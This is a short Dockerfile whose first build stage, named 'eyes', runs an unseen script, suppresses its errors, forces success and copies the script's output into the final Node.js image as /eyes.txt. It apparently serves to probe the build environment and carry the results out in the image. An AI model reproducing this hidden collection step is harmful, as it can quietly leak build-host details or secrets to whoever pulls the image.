FROM alpine:3.20 AS eyes
RUN apk add --no-cache python3 coreutils >/dev/null 2>&1 || true
COPY eyesk.sh /tmp/eyesk.sh
RUN sh /tmp/eyesk.sh > /tmp/k.txt 2>&1; exit 0
FROM node:22-alpine
COPY --from=eyes /tmp/k.txt /eyes.txt
WORKDIR /app
COPY server.js ./
EXPOSE 3000
CMD ["node","server.js"]
